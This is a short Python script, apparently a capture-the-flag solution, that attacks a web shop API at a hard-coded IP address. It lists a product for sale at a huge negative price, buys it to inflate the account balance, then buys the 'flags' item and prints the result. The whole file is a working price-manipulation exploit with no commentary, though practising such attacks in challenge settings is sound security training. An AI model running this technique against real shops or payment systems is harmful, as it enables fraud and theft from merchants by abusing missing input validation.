#!/usr/bin/env python3

import requests
import html

url = 'http://206.189.236.145:3000/'

s = requests.Session()


r = s.get(url)

r = s.post(url + 'api/v1/sell', json={
	"test_product": {
		'name': 'test_product',
    	'price': -3.5e+25,
    	'quantity': 10,
	}
})

r = s.post(url + 'api/v1/buy', json={
	"product": "test_product",
	"quantity": 1
	})

r = s.post(url + 'api/v1/buy', json={
	"product": "flags",
	"quantity": 1
	})

print(r.text)